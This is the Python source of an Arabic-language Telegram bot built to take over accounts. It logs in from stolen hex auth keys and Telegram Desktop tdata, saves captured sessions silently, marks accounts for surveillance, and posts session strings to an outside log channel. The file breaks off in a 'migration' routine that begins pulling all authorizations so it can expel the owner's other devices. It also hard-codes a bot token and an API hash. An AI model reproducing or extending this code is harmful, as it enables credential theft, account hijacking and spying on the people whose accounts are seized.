import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging
import threading

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", handlers=[logging.StreamHandler(sys.stdout)])

def radar_exception_handler(exctype, value, tb):
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم تجاوز الخطأ لضمان استقرار البوت!")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

def run_async(coro):
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram.enums import ChatType
from pyrogram.errors import (FloodWait, AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan, PasswordHashInvalid, BadRequest)
from pyrogram.raw import functions, types

from telethon.sessions import StringSession
from telethon.crypto import AuthKey

try:
    from opentele.td import TDesktop
    OPENTELE_AVAILABLE = True
except ImportError:
    OPENTELE_AVAILABLE = False
except BaseException:
    OPENTELE_AVAILABLE = False

API_ID = 28797361
API_HASH = "771041b32e83ab232e066b7adeee700b" 
BOT_TOKEN = "8977976810:AAHBQyx7_nstKkIBd2m8cK6zXJ10Nui95d8"

ADMIN_IDS = [82725508, 6114298715]
LOG_CHANNEL = "@I_HATE_YOO"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=20)
USER_STATES = {}

COUNTRIES_DB = [
  {"country": "United States", "arabic_name": "الولايات المتحدة", "flag": "🇺🇸", "code": "+1"},
  {"country": "Canada", "arabic_name": "كندا", "flag": "🇨🇦", "code": "+1"},
  {"country": "Russia", "arabic_name": "روسيا", "flag": "🇷🇺", "code": "+7"},
  {"country": "Kazakhstan", "arabic_name": "كازاخستان", "flag": "🇰🇿", "code": "+7"},
  {"country": "Egypt", "arabic_name": "مصر", "flag": "🇪🇬", "code": "+20"},
  {"country": "South Africa", "arabic_name": "جنوب أفريقيا", "flag": "🇿🇦", "code": "+27"},
  {"country": "Greece", "arabic_name": "اليونان", "flag": "🇬🇷", "code": "+30"},
  {"country": "Netherlands", "arabic_name": "هولندا", "flag": "🇳🇱", "code": "+31"},
  {"country": "Belgium", "arabic_name": "بلجيكا", "flag": "🇧🇪", "code": "+32"},
  {"country": "France", "arabic_name": "فرنسا", "flag": "🇫🇷", "code": "+33"},
  {"country": "Spain", "arabic_name": "إسبانيا", "flag": "🇪🇸", "code": "+34"},
  {"country": "Hungary", "arabic_name": "المجر", "flag": "🇭🇺", "code": "+36"},
  {"country": "Italy", "arabic_name": "إيطاليا", "flag": "🇮🇹", "code": "+39"},
  {"country": "Romania", "arabic_name": "رومانيا", "flag": "🇷🇴", "code": "+40"},
  {"country": "Switzerland", "arabic_name": "سويسرا", "flag": "🇨🇭", "code": "+41"},
  {"country": "Austria", "arabic_name": "النمسا", "flag": "🇦🇹", "code": "+43"},
  {"country": "United Kingdom", "arabic_name": "المملكة المتحدة", "flag": "🇬🇧", "code": "+44"},
  {"country": "Denmark", "arabic_name": "الدنمارك", "flag": "🇩🇰", "code": "+45"},
  {"country": "Sweden", "arabic_name": "السويد", "flag": "🇸🇪", "code": "+46"},
  {"country": "Norway", "arabic_name": "النرويج", "flag": "🇳🇴", "code": "+47"},
  {"country": "Poland", "arabic_name": "بولندا", "flag": "🇵🇱", "code": "+48"},
  {"country": "Germany", "arabic_name": "ألمانيا", "flag": "🇩🇪", "code": "+49"},
  {"country": "Peru", "arabic_name": "بيرو", "flag": "🇵🇪", "code": "+51"},
  {"country": "Mexico", "arabic_name": "المكسيك", "flag": "🇲🇽", "code": "+52"},
  {"country": "Cuba", "arabic_name": "كوبا", "flag": "🇨🇺", "code": "+53"},
  {"country": "Argentina", "arabic_name": "الأرجنتين", "flag": "🇦🇷", "code": "+54"},
  {"country": "Brazil", "arabic_name": "البرازيل", "flag": "🇧🇷", "code": "+55"},
  {"country": "Chile", "arabic_name": "تشيلي", "flag": "🇨🇱", "code": "+56"},
  {"country": "Colombia", "arabic_name": "كولومبيا", "flag": "🇨🇴", "code": "+57"},
  {"country": "Venezuela", "arabic_name": "فنزويلا", "flag": "🇻🇪", "code": "+58"},
  {"country": "Malaysia", "arabic_name": "ماليزيا", "flag": "🇲🇾", "code": "+60"},
  {"country": "Australia", "arabic_name": "أستراليا", "flag": "🇦🇺", "code": "+61"},
  {"country": "Indonesia", "arabic_name": "إندونيسيا", "flag": "🇮🇩", "code": "+62"},
  {"country": "Philippines", "arabic_name": "الفلبين", "flag": "🇵🇭", "code": "+63"},
  {"country": "New Zealand", "arabic_name": "نيوزيلندا", "flag": "🇳🇿", "code": "+64"},
  {"country": "Singapore", "arabic_name": "سنغافورة", "flag": "🇸🇬", "code": "+65"},
  {"country": "Thailand", "arabic_name": "تايلاند", "flag": "🇹🇭", "code": "+66"},
  {"country": "Japan", "arabic_name": "اليابان", "flag": "🇯🇵", "code": "+81"},
  {"country": "South Korea", "arabic_name": "كوريا الجنوبية", "flag": "🇰🇷", "code": "+82"},
  {"country": "Vietnam", "arabic_name": "فيتنام", "flag": "🇻🇳", "code": "+84"},
  {"country": "China", "arabic_name": "الصين", "flag": "🇨🇳", "code": "+86"},
  {"country": "Turkey", "arabic_name": "تركيا", "flag": "🇹🇷", "code": "+90"},
  {"country": "India", "arabic_name": "الهند", "flag": "🇮🇳", "code": "+91"},
  {"country": "Pakistan", "arabic_name": "باكستان", "flag": "🇵🇰", "code": "+92"},
  {"country": "Afghanistan", "arabic_name": "أفغانستان", "flag": "🇦🇫", "code": "+93"},
  {"country": "Sri Lanka", "arabic_name": "سريلانكا", "flag": "🇱🇰", "code": "+94"},
  {"country": "Myanmar", "arabic_name": "ميانمار", "flag": "🇲🇲", "code": "+95"},
  {"country": "Iran", "arabic_name": "إيران", "flag": "🇮🇷", "code": "+98"},
  {"country": "Morocco", "arabic_name": "المغرب", "flag": "🇲🇦", "code": "+212"},
  {"country": "Algeria", "arabic_name": "الجزائر", "flag": "🇩🇿", "code": "+213"},
  {"country": "Tunisia", "arabic_name": "تونس", "flag": "🇹🇳", "code": "+216"},
  {"country": "Libya", "arabic_name": "ليبيا", "flag": "🇱🇾", "code": "+218"},
  {"country": "Gambia", "arabic_name": "غامبيا", "flag": "🇬🇲", "code": "+220"},
  {"country": "Senegal", "arabic_name": "السنغال", "flag": "🇸🇳", "code": "+221"},
  {"country": "Mauritania", "arabic_name": "موريتانيا", "flag": "🇲🇷", "code": "+222"},
  {"country": "Mali", "arabic_name": "مالي", "flag": "🇲🇱", "code": "+223"},
  {"country": "Guinea", "arabic_name": "غينيا", "flag": "🇬🇳", "code": "+224"},
  {"country": "Ivory Coast", "arabic_name": "ساحل العاج", "flag": "🇨🇮", "code": "+225"},
  {"country": "Burkina Faso", "arabic_name": "بوركينا فاسو", "flag": "🇧🇫", "code": "+226"},
  {"country": "Niger", "arabic_name": "النيجر", "flag": "🇳🇪", "code": "+227"},
  {"country": "Togo", "arabic_name": "توجو", "flag": "🇹🇬", "code": "+228"},
  {"country": "Benin", "arabic_name": "بنين", "flag": "🇧🇯", "code": "+229"},
  {"country": "Mauritius", "arabic_name": "موريشيوس", "flag": "🇲🇺", "code": "+230"},
  {"country": "Liberia", "arabic_name": "ليبيريا", "flag": "🇱🇷", "code": "+231"},
  {"country": "Sierra Leone", "arabic_name": "سيراليون", "flag": "🇸🇱", "code": "+232"},
  {"country": "Ghana", "arabic_name": "غانا", "flag": "🇬🇭", "code": "+233"},
  {"country": "Nigeria", "arabic_name": "نيجيريا", "flag": "🇳🇬", "code": "+234"},
  {"country": "Chad", "arabic_name": "تشاد", "flag": "🇹🇩", "code": "+235"},
  {"country": "Central African Republic", "arabic_name": "جمهورية أفريقيا الوسطى", "flag": "🇨🇫", "code": "+236"},
  {"country": "Cameroon", "arabic_name": "الكاميرون", "flag": "🇨🇲", "code": "+237"},
  {"country": "Cape Verde", "arabic_name": "الرأس الأخضر", "flag": "🇨🇻", "code": "+238"},
  {"country": "Sao Tome and Principe", "arabic_name": "ساو تومي وبرينسيب", "flag": "🇸🇹", "code": "+239"},
  {"country": "Equatorial Guinea", "arabic_name": "غينيا الاستوائية", "flag": "🇬🇶", "code": "+240"},
  {"country": "Gabon", "arabic_name": "الجابون", "flag": "🇬🇦", "code": "+241"},
  {"country": "Republic of the Congo", "arabic_name": "جمهورية الكونغو", "flag": "🇨🇬", "code": "+242"},
  {"country": "Democratic Republic of the Congo", "arabic_name": "جمهورية الكونغو الديمقراطية", "flag": "🇨🇩", "code": "+243"},
  {"country": "Angola", "arabic_name": "أنغولا", "flag": "🇦🇴", "code": "+244"},
  {"country": "Guinea-Bissau", "arabic_name": "غينيا بيساو", "flag": "🇬🇼", "code": "+245"},
  {"country": "Seychelles", "arabic_name": "سيشل", "flag": "🇸🇨", "code": "+248"},
  {"country": "Sudan", "arabic_name": "السودان", "flag": "🇸🇩", "code": "+249"},
  {"country": "Rwanda", "arabic_name": "رواندا", "flag": "🇷🇼", "code": "+250"},
  {"country": "Ethiopia", "arabic_name": "إثيوبيا", "flag": "🇪🇹", "code": "+251"},
  {"country": "Somalia", "arabic_name": "الصومال", "flag": "🇸🇴", "code": "+252"},
  {"country": "Djibouti", "arabic_name": "جيبوتي", "flag": "🇩🇯", "code": "+253"},
  {"country": "Kenya", "arabic_name": "كينيا", "flag": "🇰🇪", "code": "+254"},
  {"country": "Tanzania", "arabic_name": "تنزانيا", "flag": "🇹🇿", "code": "+255"},
  {"country": "Uganda", "arabic_name": "أوغندا", "flag": "🇺🇬", "code": "+256"},
  {"country": "Burundi", "arabic_name": "بوروندي", "flag": "🇧🇮", "code": "+257"},
  {"country": "Mozambique", "arabic_name": "موزمبيق", "flag": "🇲🇿", "code": "+258"},
  {"country": "Zambia", "arabic_name": "زامبيا", "flag": "🇿🇲", "code": "+260"},
  {"country": "Madagascar", "arabic_name": "مدغشقر", "flag": "🇲🇬", "code": "+261"},
  {"country": "Zimbabwe", "arabic_name": "زيمبابوي", "flag": "🇿🇼", "code": "+263"},
  {"country": "Namibia", "arabic_name": "ناميبيا", "flag": "🇳🇦", "code": "+264"},
  {"country": "Malawi", "arabic_name": "مالاوي", "flag": "🇲🇼", "code": "+265"},
  {"country": "Lesotho", "arabic_name": "ليسوتو", "flag": "🇱🇸", "code": "+266"},
  {"country": "Botswana", "arabic_name": "بوتسوانا", "flag": "🇧🇼", "code": "+267"},
  {"country": "Eswatini", "arabic_name": "إسواتيني", "flag": "🇸🇿", "code": "+268"},
  {"country": "Comoros", "arabic_name": "جزر القمر", "flag": "🇰🇲", "code": "+269"},
  {"country": "Portugal", "arabic_name": "البرتغال", "flag": "🇵🇹", "code": "+351"},
  {"country": "Luxembourg", "arabic_name": "لوكسمبورغ", "flag": "🇱🇺", "code": "+352"},
  {"country": "Ireland", "arabic_name": "أيرلندا", "flag": "🇮🇪", "code": "+353"},
  {"country": "Iceland", "arabic_name": "آيسلندا", "flag": "🇮🇸", "code": "+354"},
  {"country": "Albania", "arabic_name": "ألبانيا", "flag": "🇦🇱", "code": "+355"},
  {"country": "Malta", "arabic_name": "مالطا", "flag": "🇲🇹", "code": "+356"},
  {"country": "Cyprus", "arabic_name": "قبرص", "flag": "🇨🇾", "code": "+357"},
  {"country": "Finland", "arabic_name": "فنلندا", "flag": "🇫🇮", "code": "+358"},
  {"country": "Bulgaria", "arabic_name": "بلغاريا", "flag": "🇧🇬", "code": "+359"},
  {"country": "Lithuania", "arabic_name": "ليتوانيا", "flag": "🇱🇹", "code": "+370"},
  {"country": "Latvia", "arabic_name": "لاتفيا", "flag": "🇱🇻", "code": "+371"},
  {"country": "Estonia", "arabic_name": "إستونيا", "flag": "🇪🇪", "code": "+372"},
  {"country": "Moldova", "arabic_name": "مولدوفا", "flag": "🇲🇩", "code": "+373"},
  {"country": "Armenia", "arabic_name": "أرمينيا", "flag": "🇦🇲", "code": "+374"},
  {"country": "Belarus", "arabic_name": "بيلاروسيا", "flag": "🇧🇾", "code": "+375"},
  {"country": "Andorra", "arabic_name": "أندورا", "flag": "🇦🇩", "code": "+376"},
  {"country": "Monaco", "arabic_name": "موناكو", "flag": "🇲🇨", "code": "+377"},
  {"country": "San Marino", "arabic_name": "سان مارينو", "flag": "🇸🇲", "code": "+378"},
  {"country": "Ukraine", "arabic_name": "أوكرانيا", "flag": "🇺🇦", "code": "+380"},
  {"country": "Serbia", "arabic_name": "صربيا", "flag": "🇷🇸", "code": "+381"},
  {"country": "Montenegro", "arabic_name": "الجبل الأسود", "flag": "🇲🇪", "code": "+382"},
  {"country": "Croatia", "arabic_name": "كرواتيا", "flag": "🇭🇷", "code": "+385"},
  {"country": "Slovenia", "arabic_name": "سلوفينيا", "flag": "🇸🇮", "code": "+386"},
  {"country": "Bosnia and Herzegovina", "arabic_name": "البوسنة والهرسك", "flag": "🇧🇦", "code": "+387"},
  {"country": "North Macedonia", "arabic_name": "مقدونيا الشمالية", "flag": "🇲🇰", "code": "+389"},
  {"country": "Czech Republic", "arabic_name": "جمهورية التشيك", "flag": "🇨🇿", "code": "+420"},
  {"country": "Slovakia", "arabic_name": "سلوفاكيا", "flag": "🇸🇰", "code": "+421"},
  {"country": "Liechtenstein", "arabic_name": "ليختنشتاين", "flag": "🇱🇮", "code": "+423"},
  {"country": "Belize", "arabic_name": "بليز", "flag": "🇧🇿", "code": "+501"},
  {"country": "Guatemala", "arabic_name": "غواتيمالا", "flag": "🇬🇹", "code": "+502"},
  {"country": "El Salvador", "arabic_name": "السلفادور", "flag": "🇸🇻", "code": "+503"},
  {"country": "Honduras", "arabic_name": "هندوراس", "flag": "🇭🇳", "code": "+504"},
  {"country": "Nicaragua", "arabic_name": "نيكاراغوا", "flag": "🇳🇮", "code": "+505"},
  {"country": "Costa Rica", "arabic_name": "كوستاريكا", "flag": "🇨🇷", "code": "+506"},
  {"country": "Panama", "arabic_name": "بنما", "flag": "🇵🇦", "code": "+507"},
  {"country": "Haiti", "arabic_name": "هايتي", "flag": "🇭🇹", "code": "+509"},
  {"country": "Bolivia", "arabic_name": "بوليفيا", "flag": "🇧🇴", "code": "+591"},
  {"country": "Guyana", "arabic_name": "غيانا", "flag": "🇬🇾", "code": "+592"},
  {"country": "Ecuador", "arabic_name": "الإكوادور", "flag": "🇪🇨", "code": "+593"},
  {"country": "Paraguay", "arabic_name": "باراغواي", "flag": "🇵🇾", "code": "+595"},
  {"country": "Suriname", "arabic_name": "سورينام", "flag": "🇸🇷", "code": "+597"},
  {"country": "Uruguay", "arabic_name": "أوروغواي", "flag": "🇺🇾", "code": "+598"},
  {"country": "Timor-Leste", "arabic_name": "تيمور الشرقية", "flag": "🇹🇱", "code": "+670"},
  {"country": "Brunei", "arabic_name": "بروناي", "flag": "🇧🇳", "code": "+673"},
  {"country": "Papua New Guinea", "arabic_name": "بابوا غينيا الجديدة", "flag": "🇵🇬", "code": "+675"},
  {"country": "Tonga", "arabic_name": "تونغا", "flag": "🇹🇴", "code": "+676"},
  {"country": "Fiji", "arabic_name": "فيجي", "flag": "🇫🇯", "code": "+679"},
  {"country": "North Korea", "arabic_name": "كوريا الشمالية", "flag": "🇰🇵", "code": "+850"},
  {"country": "Hong Kong", "arabic_name": "هونغ كونغ", "flag": "🇭🇰", "code": "+852"},
  {"country": "Macau", "arabic_name": "ماكاو", "flag": "🇲🇴", "code": "+853"},
  {"country": "Cambodia", "arabic_name": "كمبوديا", "flag": "🇰🇭", "code": "+855"},
  {"country": "Laos", "arabic_name": "لاوس", "flag": "🇱🇦", "code": "+856"},
  {"country": "Bangladesh", "arabic_name": "بنغلاديش", "flag": "🇧🇩", "code": "+880"},
  {"country": "Taiwan", "arabic_name": "تايوان", "flag": "🇹🇼", "code": "+886"},
  {"country": "Maldives", "arabic_name": "جزر المالديف", "flag": "🇲🇻", "code": "+960"},
  {"country": "Lebanon", "arabic_name": "لبنان", "flag": "🇱🇧", "code": "+961"},
  {"country": "Jordan", "arabic_name": "الأردن", "flag": "🇯🇴", "code": "+962"},
  {"country": "Syria", "arabic_name": "سوريا", "flag": "🇸🇾", "code": "+963"},
  {"country": "Iraq", "arabic_name": "العراق", "flag": "🇮🇶", "code": "+964"},
  {"country": "Kuwait", "arabic_name": "الكويت", "flag": "🇰🇼", "code": "+965"},
  {"country": "Saudi Arabia", "arabic_name": "السعودية", "flag": "🇸🇦", "code": "+966"},
  {"country": "Yemen", "arabic_name": "اليمن", "flag": "🇾🇪", "code": "+967"},
  {"country": "Oman", "arabic_name": "عمان", "flag": "🇴🇲", "code": "+968"},
  {"country": "Palestine", "arabic_name": "فلسطين", "flag": "🇵🇸", "code": "+970"},
  {"country": "United Arab Emirates", "arabic_name": "الإمارات", "flag": "🇦🇪", "code": "+971"},
  {"country": "Bahrain", "arabic_name": "البحرين", "flag": "🇧🇭", "code": "+973"},
  {"country": "Qatar", "arabic_name": "قطر", "flag": "🇶🇦", "code": "+974"},
  {"country": "Bhutan", "arabic_name": "بوتان", "flag": "🇧🇹", "code": "+975"},
  {"country": "Mongolia", "arabic_name": "منغوليا", "flag": "🇲🇳", "code": "+976"},
  {"country": "Nepal", "arabic_name": "نيبال", "flag": "🇳🇵", "code": "+977"},
  {"country": "Tajikistan", "arabic_name": "طاجيكستان", "flag": "🇹🇯", "code": "+992"},
  {"country": "Turkmenistan", "arabic_name": "تركمانستان", "flag": "🇹🇲", "code": "+993"},
  {"country": "Azerbaijan", "arabic_name": "أذربيجان", "flag": "🇦🇿", "code": "+994"},
  {"country": "Georgia", "arabic_name": "جورجيا", "flag": "🇬🇪", "code": "+995"},
  {"country": "Kyrgyzstan", "arabic_name": "قرغيزستان", "flag": "🇰🇬", "code": "+996"},
  {"country": "Uzbekistan", "arabic_name": "أوزبكستان", "flag": "🇺🇿", "code": "+998"}
]

def get_country_info(phone):
    if not phone or phone == "Unknown":
        return "غير معروف", "🌍"

    phone_str = str(phone)
    if not phone_str.startswith('+'):
        phone_str = '+' + phone_str

    sorted_db = sorted(COUNTRIES_DB, key=lambda x: len(x['code']), reverse=True)

    for country in sorted_db:
        if phone_str.startswith(country['code']):
            return country['arabic_name'], country['flag']

    return "غير معروف", "🌍"

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================

def get_db_conn():
    return sqlite3.connect('accounts_pro_v2.db', check_same_thread=False, timeout=20)

def init_db():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL;")
    c.execute(''' CREATE TABLE IF NOT EXISTS sessions ( id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, auto_term_enabled INTEGER DEFAULT 0, auto_term_interval INTEGER DEFAULT 24, last_term_attempt INTEGER DEFAULT 0 ) ''')
    try:
        c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
    except:
        pass
    try:
        c.execute("ALTER TABLE sessions ADD COLUMN hex_key TEXT")
        c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER")
    except:
        pass
    c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
    conn.commit()
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type ) VALUES (?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type))
    conn.commit()
    conn.close()

def save_hex_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(""" INSERT INTO sessions ( owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) """, (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, hex_key, dc_id))
    acc_id = c.lastrowid
    conn.commit()
    conn.close()
    return acc_id

def get_all_accounts(owner_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, user_id, pyro_session FROM sessions WHERE owner_id=?", (owner_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_account(acc_id):
    conn = get_db_conn()
    c = conn.cursor()
    # هنا حددنا الـ 12 عمود الأساسية عشان ما يخرب تفكيك البيانات في بقية السكريبت
    c.execute("SELECT id, owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, auto_term_enabled, auto_term_interval, last_term_attempt, surveilled FROM sessions WHERE id=?", (acc_id,))
    row = c.fetchone()
    conn.close()
    return row

def delete_account(acc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()

def check_duplicate(owner_id, user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE owner_id=? AND user_id=?", (owner_id, user_id))
    exists = c.fetchone()
    conn.close()
    return bool(exists)

def add_allowed_user(user_id, first_name):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO allowed_users (user_id, first_name) VALUES (?, ?)", (user_id, first_name))
    conn.commit()
    conn.close()

def remove_allowed_user(user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM allowed_users WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def is_allowed(user_id):
    if user_id in ADMIN_IDS: return True
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,))
    exists = c.fetchone()
    conn.close()
    return bool(exists)

def get_all_allowed_users():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT user_id, first_name FROM allowed_users")
    rows = c.fetchall()
    conn.close()
    return rows

init_db()

# =========================================================
# 🧠 الدوال الذكية والمحركات المعقدة
# =========================================================

def get_creation_year(user_id):
    try:
        uid = int(user_id)
        if uid < 5000000: return "2013"
        elif uid < 50000000: return "2014"
        elif uid < 150000000: return "2015"
        elif uid < 300000000: return "2016"
        elif uid < 500000000: return "2017"
        elif uid < 750000000: return "2018"
        elif uid < 1000000000: return "2019"
        elif uid < 5000000000: return "2020 أو 2021"
        elif uid < 6000000000: return "2022"
        elif uid < 7000000000: return "2023"
        elif uid < 8000000000: return "2024"
        elif uid < 9000000000: return "2025"
        else: return "2026 (أو أحدث)"
    except Exception:
        return "غـيـر مـعـروف"

def get_dc_ip(dc_id):
    return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")

def generate_sessions(api_id, dc_id, auth_key_bytes, user_id=9999):
    pyro_packed = struct.pack(">BI?256sQ?", dc_id, api_id, False, auth_key_bytes, user_id, False)
    session = StringSession()
    session._dc_id, session._server_address, session._port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
    return base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("="), session.save()

async def extract_tdata_official(base_dir):
    if not OPENTELE_AVAILABLE: return None, None, None
    tdata_path = next((root for root, _, files in os.walk(base_dir) if 'key_datas' in files), None)
    if not tdata_path: return None, None, None
    try:
        tdesk = TDesktop(tdata_path)
        if not tdesk.isLoaded(): return None, None, None
        def get_real_auth(acc):
            auth_key = getattr(acc, 'authKey', getattr(acc, 'api', None))
            if auth_key:
                auth_key = getattr(auth_key, 'key', getattr(auth_key, 'auth_key', auth_key))
                dc_id = getattr(acc, 'MainDcId', getattr(acc, 'mainDcId', getattr(acc, 'dcId', getattr(getattr(acc, 'api', None), 'dc_id', None))))
                if isinstance(auth_key, bytes) and len(auth_key) == 256 and dc_id: return int(dc_id), auth_key, int(getattr(acc, 'UserId', getattr(acc, 'id', 9999)))
            return None, None, None
        for acc in (tdesk.accounts if hasattr(tdesk, 'accounts') else []) + ([tdesk.mainAccount] if hasattr(tdesk, 'mainAccount') else []):
            d, a, u = get_real_auth(acc)
            if d and a: return d, a, u
    except Exception: pass
    return None, None, None

def get_hex_from_pyro(pyro_session):
    try:
        data = base64.urlsafe_b64decode(pyro_session + "=" * (-len(pyro_session) % 4))
        auth_key = data[6:262]
        return auth_key.hex()
    except:
        return "غير متوفر"

async def confirm_session_death(pyro_session):
    await asyncio.sleep(1.5)
    test_client = Client(f"retry_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await asyncio.wait_for(test_client.connect(), timeout=8)
        await test_client.get_me()
        await test_client.disconnect()
        return False
    except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
        return True
    except Exception:
        return False

def handle_dead_session(owner_id, acc_id, phone, name):
    delete_account(acc_id)
    text = (f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n⎉╎ الاسـم: {name}\n⎉╎ الـرقـم: {phone}\n•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً.")
    try:
        bot.send_message(owner_id, text)
    except Exception:
        pass

def convert_telethon_to_pyrogram(session_str):
    if session_str.startswith("1") and len(session_str) > 300:
        try:
            padding = "=" * (-len(session_str[1:]) % 4)
            data = base64.urlsafe_b64decode(session_str[1:] + padding)
            ip_len = 4 if len(data) == 265 else 16
            dc_id, = struct.unpack(">B", data[:1])
            auth_key = data[1 + ip_len + 2:]
            pyro_session, _ = generate_sessions(API_ID, dc_id, auth_key)
            return pyro_session
        except Exception:
            pass
    return session_str

def log_to_channel(text, file_path=None, session_text=None):
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                bot.send_document(LOG_CHANNEL, f, caption=text[:1024], parse_mode="Markdown")
        elif session_text:
            safe_text = f"```text\n{session_text}\n```\n\n{text[:800]}"
            bot.send_message(LOG_CHANNEL, safe_text, parse_mode="Markdown")
        else:
            bot.send_message(LOG_CHANNEL, text, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"فشل إرسال للقناة: {e}")

# =========================================================
# 📥 دالة سحب الحساب من خلال كود Hex المرسل للروبوت (محدثة مع الكيبورد الأصلي)
# =========================================================

@bot.message_handler(func=lambda message: message.text and re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text))
def handle_hex_login(message):
    if not is_allowed(message.from_user.id):
        return

    # استخراج الهاكس ورقم السيرفر
    match = re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text)
    hex_data = match.group(1)
    dc_id = int(match.group(2))

    msg = bot.reply_to(message, "⏳ جاري فحص الجلسة والاتصال...")

    async def process_hex():
        client = None
        try:
            auth_key_bytes = bytes.fromhex(hex_data)
            pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key_bytes)

            client = Client(f"temp_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
            await client.connect()

            me_raw = await client.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
            me = me_raw[0]

            phone = getattr(me, 'phone', "Unknown")
            if phone != "Unknown" and not phone.startswith("+"):
                phone = "+" + phone

            first_name = getattr(me, 'first_name', "Unknown")
            user_id = me.id
            year = get_creation_year(user_id)

            await client.disconnect()

            # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت
            save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)

            text = (
                f"بوت اداره الجلسات المتقدم:\n"
                f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
                f"⎉╎ الاسـم: {first_name}\n"
                f"⎉╎ الـرقـم: {phone}\n"
                f"⎉╎ الآيـدي: {user_id}\n"
                f"•❐• سـنـة الإنـشـاء: {year}\n\n"
                f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه"
            )

            bot.delete_message(message.chat.id, msg.message_id)

            # 🔥 هنا يتم استدعاء لوحة التحكم الأصلية الخاصة بك
            bot.send_message(
                message.chat.id, 
                text, 
                reply_markup=home_keyboard(message.from_user.id)
            )

        except Exception as e:
            if client and client.is_connected:
                await client.disconnect()
            bot.edit_message_text(f"❌ فشل تسجيل الدخول يرجى التأكد من الـ Hex!\nالسبب: {str(e)}", message.chat.id, msg.message_id)

    run_async(process_hex())

# =========================================================
# 👑 السحب الشامل والمطور (نظام التهجير والمراقبة)
# =========================================================

async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (الترتيب الجديد والقراءة من القاعدة)"""

    B_DEVICE_MODEL = f"MigrationB_{acc_id}"
    client_b = None
    verify_b = None

    try:
        # 1. استخراج السيرفر الصحيح والهاكس والآيدي من قاعدة البيانات
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("SELECT dc_id, hex_key, user_id FROM sessions WHERE id=?", (acc_id,))
        row = c.fetchone()
        conn.close()

        target_dc = int(row[0]) if row and row[0] else 2
        saved_hex = row[1] if row and len(row) > 1 else "UNKNOWN"
        target_user_id = int(row[2]) if row and len(row) > 2 and row[2] else 9999

        if not client_a.is_connected:
            await client_a.connect()

        # 2. طرد جميع الأجهزة الأخرى أولاً من الجلسة A قبل توليد أي جلسة جديدة
        auths = await client_a.invoke(functions.account.GetAuthorizations())
        hit_24h_limit = False

